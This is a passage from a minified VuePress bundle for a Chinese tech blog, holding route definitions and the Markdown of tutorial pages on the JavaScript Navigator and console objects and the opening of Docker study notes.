9C%AF.html"},{path:"/React/React项目/04-React开发技术.html",redirect:"/React/React%E9%A1%B9%E7%9B%AE/04-React%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF.html"},{name:"v-62f4f016",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/01-%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-62f4f016").then(t)}},{path:"/数据结构/排序/01-插入排序.html",redirect:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/01-%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F.html"},{path:"/数据结构/排序/01-插入排序.html",redirect:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/01-%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F.html"},{name:"v-73512eb8",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/03-%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-73512eb8").then(t)}},{path:"/数据结构/排序/03-冒泡排序.html",redirect:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/03-%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F.html"},{path:"/数据结构/排序/03-冒泡排序.html",redirect:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/03-%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F.html"},{name:"v-4e8396ae",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/05-%E7%AE%80%E5%8D%95%E6%8E%92%E5%BA%8F.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-4e8396ae").then(t)}},{path:"/数据结构/排序/05-简单排序.html",redirect:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/05-%E7%AE%80%E5%8D%95%E6%8E%92%E5%BA%8F.html"},{path:"/数据结构/排序/05-简单排序.html",redirect:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/05-%E7%AE%80%E5%8D%95%E6%8E%92%E5%BA%8F.html"},{name:"v-6a8af3a8",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/07-%E5%A4%8D%E5%90%88%E7%B1%BB%E5%9E%8B.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-6a8af3a8").then(t)}},{path:"/数据结构/C语言程序设计/07-复合类型.html",redirect:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/07-%E5%A4%8D%E5%90%88%E7%B1%BB%E5%9E%8B.html"},{path:"/数据结构/C语言程序设计/07-复合类型.html",redirect:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/07-%E5%A4%8D%E5%90%88%E7%B1%BB%E5%9E%8B.html"},{name:"v-7f0e1f7e",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/02-%E5%B8%8C%E5%B0%94%E6%8E%92%E5%BA%8F.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-7f0e1f7e").then(t)}},{path:"/数据结构/排序/02-希尔排序.html",redirect:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/02-%E5%B8%8C%E5%B0%94%E6%8E%92%E5%BA%8F.html"},{path:"/数据结构/排序/02-希尔排序.html",redirect:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/02-%E5%B8%8C%E5%B0%94%E6%8E%92%E5%BA%8F.html"},{name:"v-51ff2b5c",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/06-%E5%A0%86%E6%8E%92%E5%BA%8F.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-51ff2b5c").then(t)}},{path:"/数据结构/排序/06-堆排序.html",redirect:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/06-%E5%A0%86%E6%8E%92%E5%BA%8F.html"},{path:"/数据结构/排序/06-堆排序.html",redirect:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/06-%E5%A0%86%E6%8E%92%E5%BA%8F.html"},{name:"v-35e2424c",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/07-%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-35e2424c").then(t)}},{path:"/数据结构/排序/07-归并排序.html",redirect:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/07-%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F.html"},{path:"/数据结构/排序/07-归并排序.html",redirect:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/07-%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F.html"},{name:"v-0cf37c6e",path:"/React/Redux/05-Redux-thunk.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-0cf37c6e").then(t)}},{name:"v-dbded3f4",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/04-%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-dbded3f4").then(t)}},{path:"/数据结构/排序/04-快速排序.html",redirect:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/04-%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F.html"},{path:"/数据结构/排序/04-快速排序.html",redirect:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/04-%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F.html"},{name:"v-1bea5d48",path:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/00-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html",component:Bl,beforeEnter:function(n,e,t){Hi("Layout","v-1bea5d48").then(t)}},{path:"/数据结构/排序/00-基本概念.html",redirect:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/00-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html"},{path:"/数据结构/排序/00-基本概念.html",redirect:"/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%8E%92%E5%BA%8F/00-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html"},{path:"*",component:Bl}],Tl={title:"lwz blog",description:"一个基于vuepress的技术站点",base:"/blog",headTags:[["link",{rel:"icon",href:"/blogicon.jpg"}],["meta",{name:"keywords",content:"vuepress,blog,主题"}]],pages:[{title:"Navigator 对象",frontmatter:{},regularPath:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/Navigator%E5%AF%B9%E8%B1%A1.html",relativePath:"Javascript/JavaScriptBOM操作/Navigator对象.md",key:"v-45c98a7a",path:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/Navigator%E5%AF%B9%E8%B1%A1.html",headers:[{level:2,title:"Navigator的属性",slug:"navigator的属性",normalizedTitle:"navigator的属性",charIndex:68},{level:3,title:"检测浏览器",slug:"检测浏览器",normalizedTitle:"检测浏览器",charIndex:682},{level:2,title:"Vibration（震动）",slug:"vibration-震动",normalizedTitle:"vibration（震动）",charIndex:3966},{level:3,title:"用途",slug:"用途",normalizedTitle:"用途",charIndex:4205}],headersStr:"Navigator的属性 检测浏览器 Vibration（震动） 用途",content:'# Navigator 对象\n\nNavigator 对象包含有关浏览器的信息,是window对象的属性，中文是"导航器"的意思\n\n\n# Navigator的属性\n\n属性              描述                             值\nlanguage        返回当前浏览器的语言                     "zh-CN"、"en"等\ncookieEnabled   返回指明浏览器中是否启用 cookie 的布尔值       true,false\nonLine          返回指明系统是否处于联网状态的布尔值             true,false\nplatform        返回运行浏览器的操作系统平台。                "Win32", "Linux i686", "MacPPC", "MacIntel", 等\nuserAgent       返回由客户机发送服务器的 user-agent 头部的值   userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2)\n                                               AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109\n                                               Safari/537.36"\n\n\n# 检测浏览器\n\n检测浏览器版本：\n\n function getExplorerInfo() {\n    var explorer = window.navigator.userAgent.toLowerCase();\n    //ie\n    if (explorer.indexOf("msie") >= 0) {\n        var ver = explorer.match(/msie ([\\d.]+)/)[1];\n        return { type: "IE", version: ver };\n    }\n    else if (explorer.indexOf("edge") >= 0) {\n        var ver = explorer.match(/edge\\/([\\d.]+)/)[1];\n        return { type: "Edge", version: ver };\n    }\n    //firefox\n    else if (explorer.indexOf("firefox") >= 0) {\n        var ver = explorer.match(/firefox\\/([\\d.]+)/)[1];\n        return { type: "Firefox", version: ver };\n    }\n    //Chrome\n    else if (explorer.indexOf("chrome") >= 0) {\n        var ver = explorer.match(/chrome\\/([\\d.]+)/)[1];\n        return { type: "Chrome", version: ver };\n    }\n    //Opera\n    else if (explorer.indexOf("opera") >= 0) {\n        var ver = explorer.match(/opera.([\\d.]+)/)[1];\n        return { type: "Opera", version: ver };\n    }\n    //Safari\n    else if (explorer.indexOf("safari") >= 0) {\n        var ver = explorer.match(/safari\\/([\\d.]+)/)[1];\n        return { type: "Safari", version: ver };\n    }\n}\n\n\n检测浏览器是否为PC端\n\nfunction getExplorerType(){\n    var explorer = window.navigator.userAgent.toLowerCase();\n    return explorer.indexOf(\'mobile\') === -1\n}\n\n\n结果：true PC , false 为 Mobile\n\n检测当前网络状态\n\n//浏览器在线\nwindow.ononline = function(){\n    console.log(window.navigator.onLine)\n}\n\n//浏览器离线\nwindow.onoffline = function(){\n    console.log(window.navigator.onLine)\n}\n\n\nh5相机拍照\n\n<!DOCTYPE html>\n<html>\n    <head lang="en">\n        <meta charset="UTF-8">\n        <title></title>\n        <script type="text/javascript" src="jquery.min.js"><\/script>\n        <script>\n            window.addEventListener("DOMContentLoaded", function () {\n                var canvas = document.getElementById("canvas"),\n                    context = canvas.getContext("2d"),\n                    video = document.getElementById("video"),\n                    videoObj = {\n                        "video": true\n                    },\n                    errBack = function (error) {\n                        console.log("Video capture error: ", error.code);\n                    };\n                $("#snap").click(function () {\n                    context.drawImage(video, 0, 0, 330, 250);\n                })\n                if (navigator.mediaDevices.getUserMedia) {\n                    navigator.mediaDevices.getUserMedia(videoObj)\n                    .then(function (stream) {\n                        video.srcObject = stream;\n                        video.play();\n                    })\n                    .catch(errBack)\n                } else if (navigator.webkitGetUserMedia) {\n                    navigator.webkitGetUserMedia(videoObj, function (stream) {\n                        video.src = window.webkitURL.createObjectURL(stream);\n                        video.play();\n                    }, errBack);\n                }\n            }, false);\n        <\/script>\n    </head>    \n    <body>\n        <div id="contentHolder">\n            <video id="video" width="320" height="320" autoplay></video>\n            <input type="button" id="snap" style="width:100px;height:35px;" value="拍 照" />\n            <canvas style="" id="canvas" width="320" height="320"></canvas>\n        </div>\n    </body>\n</html>\n\n\n\n# Vibration（震动）\n\n// 可以传入一个大于0的数字，表示让手机震动相应的时间长度，单位为ms\nnavigator.vibrate(100)\n\n// 也可以传入一个包含数字的数组，比如下面这样就是代表震动300ms，暂停200ms，震动100ms，暂停400ms，震动100ms\nnavigator.vibrate([300,200,100,400,100])\n\n// 也可以传入0或者一个全是0的数组，表示暂停震动\nnavigator.vibrate(0)\n\n\n\n# 用途\n\n使手机震动，用来给用户一个提示，例如说数据校验失败。',normalizedContent:'# navigator 对象\n\nnavigator 对象包含有关浏览器的信息,是window对象的属性，中文是"导航器"的意思\n\n\n# navigator的属性\n\n属性              描述                             值\nlanguage        返回当前浏览器的语言                     "zh-cn"、"en"等\ncookieenabled   返回指明浏览器中是否启用 cookie 的布尔值       true,false\nonline          返回指明系统是否处于联网状态的布尔值             true,false\nplatform        返回运行浏览器的操作系统平台。                "win32", "linux i686", "macppc", "macintel", 等\nuseragent       返回由客户机发送服务器的 user-agent 头部的值   useragent: "mozilla/5.0 (macintosh; intel mac os x 10_14_2)\n                                               applewebkit/537.36 (khtml, like gecko) chrome/72.0.3626.109\n                                               safari/537.36"\n\n\n# 检测浏览器\n\n检测浏览器版本：\n\n function getexplorerinfo() {\n    var explorer = window.navigator.useragent.tolowercase();\n    //ie\n    if (explorer.indexof("msie") >= 0) {\n        var ver = explorer.match(/msie ([\\d.]+)/)[1];\n        return { type: "ie", version: ver };\n    }\n    else if (explorer.indexof("edge") >= 0) {\n        var ver = explorer.match(/edge\\/([\\d.]+)/)[1];\n        return { type: "edge", version: ver };\n    }\n    //firefox\n    else if (explorer.indexof("firefox") >= 0) {\n        var ver = explorer.match(/firefox\\/([\\d.]+)/)[1];\n        return { type: "firefox", version: ver };\n    }\n    //chrome\n    else if (explorer.indexof("chrome") >= 0) {\n        var ver = explorer.match(/chrome\\/([\\d.]+)/)[1];\n        return { type: "chrome", version: ver };\n    }\n    //opera\n    else if (explorer.indexof("opera") >= 0) {\n        var ver = explorer.match(/opera.([\\d.]+)/)[1];\n        return { type: "opera", version: ver };\n    }\n    //safari\n    else if (explorer.indexof("safari") >= 0) {\n        var ver = explorer.match(/safari\\/([\\d.]+)/)[1];\n        return { type: "safari", version: ver };\n    }\n}\n\n\n检测浏览器是否为pc端\n\nfunction getexplorertype(){\n    var explorer = window.navigator.useragent.tolowercase();\n    return explorer.indexof(\'mobile\') === -1\n}\n\n\n结果：true pc , false 为 mobile\n\n检测当前网络状态\n\n//浏览器在线\nwindow.ononline = function(){\n    console.log(window.navigator.online)\n}\n\n//浏览器离线\nwindow.onoffline = function(){\n    console.log(window.navigator.online)\n}\n\n\nh5相机拍照\n\n<!doctype html>\n<html>\n    <head lang="en">\n        <meta charset="utf-8">\n        <title></title>\n        <script type="text/javascript" src="jquery.min.js"><\/script>\n        <script>\n            window.addeventlistener("domcontentloaded", function () {\n                var canvas = document.getelementbyid("canvas"),\n                    context = canvas.getcontext("2d"),\n                    video = document.getelementbyid("video"),\n                    videoobj = {\n                        "video": true\n                    },\n                    errback = function (error) {\n                        console.log("video capture error: ", error.code);\n                    };\n                $("#snap").click(function () {\n                    context.drawimage(video, 0, 0, 330, 250);\n                })\n                if (navigator.mediadevices.getusermedia) {\n                    navigator.mediadevices.getusermedia(videoobj)\n                    .then(function (stream) {\n                        video.srcobject = stream;\n                        video.play();\n                    })\n                    .catch(errback)\n                } else if (navigator.webkitgetusermedia) {\n                    navigator.webkitgetusermedia(videoobj, function (stream) {\n                        video.src = window.webkiturl.createobjecturl(stream);\n                        video.play();\n                    }, errback);\n                }\n            }, false);\n        <\/script>\n    </head>    \n    <body>\n        <div id="contentholder">\n            <video id="video" width="320" height="320" autoplay></video>\n            <input type="button" id="snap" style="width:100px;height:35px;" value="拍 照" />\n            <canvas style="" id="canvas" width="320" height="320"></canvas>\n        </div>\n    </body>\n</html>\n\n\n\n# vibration（震动）\n\n// 可以传入一个大于0的数字，表示让手机震动相应的时间长度，单位为ms\nnavigator.vibrate(100)\n\n// 也可以传入一个包含数字的数组，比如下面这样就是代表震动300ms，暂停200ms，震动100ms，暂停400ms，震动100ms\nnavigator.vibrate([300,200,100,400,100])\n\n// 也可以传入0或者一个全是0的数组，表示暂停震动\nnavigator.vibrate(0)\n\n\n\n# 用途\n\n使手机震动，用来给用户一个提示，例如说数据校验失败。',charsets:{cjk:!0}},{title:"console对象",frontmatter:{},regularPath:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/console%E5%AF%B9%E8%B1%A1.html",relativePath:"Javascript/JavaScriptBOM操作/console对象.md",key:"v-eff1ac7a",path:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/console%E5%AF%B9%E8%B1%A1.html",headers:[{level:2,title:"console对象方法",slug:"console对象方法",normalizedTitle:"console对象方法",charIndex:109},{level:3,title:"console.log",slug:"console-log",normalizedTitle:"console.log",charIndex:798},{level:3,title:"consoel.time",slug:"consoel-time",normalizedTitle:"consoel.time",charIndex:1013},{level:3,title:"console.table",slug:"console-table",normalizedTitle:"console.table",charIndex:1820}],headersStr:"console对象方法 console.log consoel.time console.table",content:'# console对象\n\nConsole 对象是 windows子对象，提供了对浏览器控制台的接入，可以在任何全局对象中访问，被浏览器定义为 Window.console，也可被简单的 console 调用。\n\n\n# console对象方法\n\n属性        参数                        返回值         功能                             兼容性\nlog       msg                       undefined   向 Web 控制台输出一条消息                全部\ndir       object                    undefined   打印出对象的所有属性和属性值                 >ie8\nerror     msg                       undefined   向 Web 控制台输出一条错误消息              >ie7\nwarn      msg                       undefined   向 Web 控制台输出一条警告信息              >ie7\ntime      timerName                 undefined   启动一个计时器（timer）来跟踪某一个操作的占用时长    >ie10\ntimeEnd   timerName                 undefined   停止一个通过 console.time() 启动的计时器   >ie10\ntable     tabledata, tablecolumns   undefined   用于在控制台输出表格信息。                  >ie12\n\n\n# console.log\n\nconsole.log() 方法用于在控制台输出信息。\n\n该方法对于开发过程进行测试很有帮助。\n\n提示: 在测试该方法的过程中，控制台需要可见 (浏览器按下 F12 打开控制台)。\n\n语法\n\nconsole.log(message)\n\n\n参数说明\n\n参数        类型                描述\nmessage   String 或 Object   必需，控制台上要显示的信息\n\n\n# consoel.time\n\nconsoel.time()和console.timeEnd()这两个方法可以用来让WEB开发人员测量一个javascript脚本程序执行消耗的时间。\n\nconsole.time方法是开始计算时间，console.timeEnd是停止计时，输出脚本执行的时间:\n\n// 启动计时器\nconsole.time(\'testForEach\');\n// (测试用代码)\n// 停止计时，输出时间\nconsole.timeEnd(\'testForEach\');\n\n// testForEach 4522.303ms\n\n\n参数说明\n\n参数             类型       描述\nlabel          String   可选，用于给计算器设置标签。\ntablecolumns   Array    可选，一个数组，表格标题栏的名称。\n\n这两个方法中都可以传入一个参数，作为计时器的名称，它的作用是在代码并行运行时分清楚各个计时器。所以两个方法的参数必须相同。\n\n对console.timeEnd的调用会立即输出执行总共消耗的时间，单位是毫秒\n\nfor 循环测试\n\nvar i;\nconsole.time("for 循环测试");\nfor (i = 0; i < 100000; i++) {\n  // 代码部分\n}\nconsole.timeEnd("for 循环测试");\n\n\n测试ajax请求所需时间：\n\nconsole.time("ajax请求时间")\n$.ajax({\n  url:"https://zhihu-daily.leanapp.cn/api/v1/last-stories",\n  success(res){\n    console.timeEnd("ajax请求时间")\n  }\n})\n//  ajax请求时间: 189.089111328125ms\n\n\n\n# console.table\n\nconsole.table() 方法用于在控制台输出表格信息。\n\n第一个参数是必需的，且对象类型需要是对象或数组，对应的数据会填充到表格中。\n\n提示: 在测试该方法的过程中，控制台需要可见 (浏览器按下 F12 打开控制台)。\n\n语法\n\nconsole.table(tabledata, tablecolumns)\n\n\n参数说明\n\n参数             类型               描述\ntabledata      Array 或 Object   必需，填充到表格中的数据。\ntablecolumns   Array            可选，一个数组，表格标题栏的名称。\n\nconsole.table(["king", "lilei", "susan"]);\n',normalizedContent:'# console对象\n\nconsole 对象是 windows子对象，提供了对浏览器控制台的接入，可以在任何全局对象中访问，被浏览器定义为 window.console，也可被简单的 console 调用。\n\n\n# console对象方法\n\n属性        参数                        返回值         功能                             兼容性\nlog       msg                       undefined   向 web 控制台输出一条消息                全部\ndir       object                    undefined   打印出对象的所有属性和属性值                 >ie8\nerror     msg                       undefined   向 web 控制台输出一条错误消息              >ie7\nwarn      msg                       undefined   向 web 控制台输出一条警告信息              >ie7\ntime      timername                 undefined   启动一个计时器（timer）来跟踪某一个操作的占用时长    >ie10\ntimeend   timername                 undefined   停止一个通过 console.time() 启动的计时器   >ie10\ntable     tabledata, tablecolumns   undefined   用于在控制台输出表格信息。                  >ie12\n\n\n# console.log\n\nconsole.log() 方法用于在控制台输出信息。\n\n该方法对于开发过程进行测试很有帮助。\n\n提示: 在测试该方法的过程中，控制台需要可见 (浏览器按下 f12 打开控制台)。\n\n语法\n\nconsole.log(message)\n\n\n参数说明\n\n参数        类型                描述\nmessage   string 或 object   必需，控制台上要显示的信息\n\n\n# consoel.time\n\nconsoel.time()和console.timeend()这两个方法可以用来让web开发人员测量一个javascript脚本程序执行消耗的时间。\n\nconsole.time方法是开始计算时间，console.timeend是停止计时，输出脚本执行的时间:\n\n// 启动计时器\nconsole.time(\'testforeach\');\n// (测试用代码)\n// 停止计时，输出时间\nconsole.timeend(\'testforeach\');\n\n// testforeach 4522.303ms\n\n\n参数说明\n\n参数             类型       描述\nlabel          string   可选，用于给计算器设置标签。\ntablecolumns   array    可选，一个数组，表格标题栏的名称。\n\n这两个方法中都可以传入一个参数，作为计时器的名称，它的作用是在代码并行运行时分清楚各个计时器。所以两个方法的参数必须相同。\n\n对console.timeend的调用会立即输出执行总共消耗的时间，单位是毫秒\n\nfor 循环测试\n\nvar i;\nconsole.time("for 循环测试");\nfor (i = 0; i < 100000; i++) {\n  // 代码部分\n}\nconsole.timeend("for 循环测试");\n\n\n测试ajax请求所需时间：\n\nconsole.time("ajax请求时间")\n$.ajax({\n  url:"https://zhihu-daily.leanapp.cn/api/v1/last-stories",\n  success(res){\n    console.timeend("ajax请求时间")\n  }\n})\n//  ajax请求时间: 189.089111328125ms\n\n\n\n# console.table\n\nconsole.table() 方法用于在控制台输出表格信息。\n\n第一个参数是必需的，且对象类型需要是对象或数组，对应的数据会填充到表格中。\n\n提示: 在测试该方法的过程中，控制台需要可见 (浏览器按下 f12 打开控制台)。\n\n语法\n\nconsole.table(tabledata, tablecolumns)\n\n\n参数说明\n\n参数             类型               描述\ntabledata      array 或 object   必需，填充到表格中的数据。\ntablecolumns   array            可选，一个数组，表格标题栏的名称。\n\nconsole.table(["king", "lilei", "susan"]);\n',charsets:{cjk:!0}},{title:"Docker",frontmatter:{},regularPath:"/Docker/",relativePath:"Docker/README.md",key:"v-16dd6f9c",path:"/Docker/",headers:[{level:2,title:"参考资料",slug:"参考资料",normalizedTitle:"参考资料",charIndex:15},{level:2,title:"前期基础",slug:"前期基础",normalizedTitle:"前期基础",charIndex:229},{level:2,title:"Docker概述",slug:"docker概述",normalizedTitle:"docker概述",charIndex:261},{level:3,title:"Docker为什么会出现",slug:"docker为什么会出现",normalizedTitle:"docker为什么会出现",charIndex:274},{level:3,title:"Docker的历史",slug:"docker的历史",normalizedTitle:"docker的历史",charIndex:555},{level:3,title:"容器vs虚拟机",slug:"容器vs虚拟机",normalizedTitle:"容器vs虚拟机",charIndex:776},{level:2,title:"Docker安装",slug:"docker安装",normalizedTitle:"docker安装",charIndex:1056},{level:3,title:"Docker的基本组成",slug:"docker的基本组成",normalizedTitle:"docker的基本组成",charIndex:1069},{level:3,title:"环境准备",slug:"环境准备",normalizedTitle:"环境准备",charIndex:1341},{level:3,title:"安装xbash",slug:"安装xbash",normalizedTitle:"安装xbash",charIndex:1431},{level:3,title:"Centos安装",slug:"centos安装",normalizedTitle:"centos安装",charIndex:1899},{level:3,title:"卸载旧的版本",slug:"卸载旧的版本",normalizedTitle:"卸载旧的版本",charIndex:1960},{level:3,title:"安装基本环境",slug:"安装基本环境",normalizedTitle:"安装基本环境",charIndex:2268},{level:3,title:"设置镜像的仓库",slug:"设置镜像的仓库",normalizedTitle:"设置镜像的仓库",charIndex:2329},{level:3,title:"安装docker引擎",slug:"安装docker引擎",normalizedTitle:"安装docker引擎",charIndex:2710},{level:3,title:"启动Docker",slug:"启动docker",normalizedTitle:"启动docker",charIndex:2837},{level:3,title:"卸载Docker",slug:"卸载docker",normalizedTitle:"卸载docker",charIndex:3788},{level:3,title:"阿里云镜像加速",slug:"阿里云镜像加速",normalizedTitle:"阿里云镜像加速",charIndex:3908},{level:2,title:"底层原理",slug:"底层原理",normalizedTitle:"底层原理",charIndex:4460},{level:2,title:"Docker命令",slug:"docker命令",normalizedTitle:"docker命令",charIndex:4705},{level:3,title:"帮助命令",slug:"帮助命令",normalizedTitle:"帮助命令",charIndex:4718},{level:3,title:"镜像命令",slug:"镜像命令",normalizedTitle:"镜像命令",charIndex:4820},{level:3,title:"容器命令",slug:"容器命令",normalizedTitle:"容器命令",charIndex:6944},{level:3,title:"常用其他命令",slug:"常用其他命令",normalizedTitle:"常用其他命令",charIndex:12095},{level:3,title:"可视化",slug:"可视化",normalizedTitle:"可视化",charIndex:35117},{level:3,title:"",slug:"",normalizedTitle:"",charIndex:0},{level:2,title:"Docker镜像",slug:"docker镜像",normalizedTitle:"docker镜像",charIndex:35409},{level:3,title:"原理",slug:"原理",normalizedTitle:"原理",charIndex:810},{level:3,title:"commit提交镜像",slug:"commit提交镜像",normalizedTitle:"commit提交镜像",charIndex:35572},{level:2,title:"容器数据卷",slug:"容器数据卷",normalizedTitle:"容器数据卷",charIndex:35990},{level:3,title:"什么是容器卷",slug:"什么是容器卷",normalizedTitle:"什么是容器卷",charIndex:36e3},{level:3,title:"使用数据卷",slug:"使用数据卷",normalizedTitle:"使用数据卷",charIndex:36174},{level:3,title:"实战安装mysql",slug:"实战安装mysql",normalizedTitle:"实战安装mysql",charIndex:36351},{level:3,title:"具名和匿名挂载",slug:"具名和匿名挂载",normalizedTitle:"具名和匿名挂载",charIndex:36688},{level:3,title:"",slug:"-2",normalizedTitle:"",charIndex:0},{level:3,title:"多个容器数据共享",slug:"多个容器数据共享",normalizedTitle:"多个容器数据共享",charIndex:37409},{level:2,title:"DockerFile",slug:"dockerfile",normalizedTitle:"dockerfile",charIndex:36705},{level:3,title:"官方DockerFile示例",slug:"官方dockerfile示例",normalizedTitle:"官方dockerfile示例",charIndex:38283},{level:3,title:"DockerFile基础知识",slug:"dockerfile基础知识",normalizedTitle:"dockerfile基础知识",charIndex:38419},{level:3,title:"DockerFile命令",slug:"dockerfile命令",normalizedTitle:"dockerfile命令",charIndex:38636},{level:3,title:"",slug:"-3",normalizedTitle:"",charIndex:0},{level:3,title:"实战构建自己的centos",slug:"实战构建自己的centos",normalizedTitle:"实战构建自己的centos",charIndex:38986},{level:3,title:"CMD与ENTRYPOINT",slug:"cmd与entrypoint",normalizedTitle:"cmd与entrypoint",charIndex:39932}],headersStr:"参考资料 前期基础 Docker概述 Docker为什么会出现 Docker的历史 容器vs虚拟机 Docker安装 Docker的基本组成 环境准备 安装xbash Centos安装 卸载旧的版本 安装基本环境 设置镜像的仓库 安装docker引擎 启动Docker 卸载Docker 阿里云镜像加速 底层原理 Docker命令 帮助命令 镜像命令 容器命令 常用其他命令 可视化  Docker镜像 原理 commit提交镜像 容器数据卷 什么是容器卷 使用数据卷 实战安装mysql 具名和匿名挂载  多个容器数据共享 DockerFile 官方DockerFile示例 DockerFile基础知识 DockerFile命令  实战构建自己的centos CMD与ENTRYPOINT",content:'# Docker\n\n\n\n\n# 参考资料\n\n官方文档：https://docs.docker.com/docker-for-windows/\n\n【官方文档超级详细】\n\n仓库地址：https://hub.docker.com/\n\n【发布到仓库，git pull push】\n\nb站教程：https://www.bilibili.com/video/BV1og4y1q7M4?\n\n【这个教程非常简洁！且深入！基于企业应用场景！推荐！以下笔记都基于该课程】\n\n\n# 前期基础\n\nlinux基本命令，类似cd，mkdir等\n\n\n# Docker概述\n\n\n# Docker为什么会出现\n\n一款产品，开发和上线两套环境，应用环境配置费时费力，而且容易出问题\n\n尤其对于机器学习和深度学习的库更是如此，很可能存在版本问题、底层依赖冲突问题\n\n所以发布项目时，不只是一套代码过去，而是代码+环境整体打包过去\n\n所谓开发即运维，保证系统稳定性，提高部署效率\n\n使用Docker后的流程：\n\n开发：建立模型--环境--打包带上环境，即镜像--放到Docker仓库\n\n部署：下载Docker中的镜像，直接运行即可\n\nDocker的思想来自于集装箱，集装箱，对环境进行隔离\n\nDocker通过隔离机制，可以将服务器利用到极致。\n\n\n# Docker的历史\n\n2010年，几个搞IT的人，在美国成立一家公司dotCloud\n\n做一些pass的云计算服务\n\n他们将自己的容器化技术命名为Docker\n\nDocker基于Go语言开发\n\nDocker刚刚诞生的时候，没有引起行业的注意，dotCloud活不下去\n\n然后他们决定开源\n\n2013年，创始人将Docker开源，不开则以，一开惊人，刚开源的时候，每个月都会更新一个版本\n\n2014年4月9日，Docker 1.0发布\n\n\n# 容器vs虚拟机\n\n在容器技术出来之前，用的是虚拟机技术\n\n# 虚拟机原理示意图\n\n\n\n缺点：\n\n 1. 资源占用多\n 2. 冗余步骤多\n 3. 启动很慢\n\n# 容器化技术示意图\n\n不是模拟的完整的操作系统\n\n\n\n# 二者对比\n\n比较虚拟机和Docker的不同\n\n       传统虚拟机           DOCKER\n虚拟内容   硬件+完整的操作系统+软件   APP+LIB\n大小     笨重，通常几个G        轻便几个M或KB\n启动速度   慢，分钟级           快，秒级\n                       \n\n\n# Docker安装\n\n\n# Docker的基本组成\n\n\n\n明确几个概念：\n\n 1. 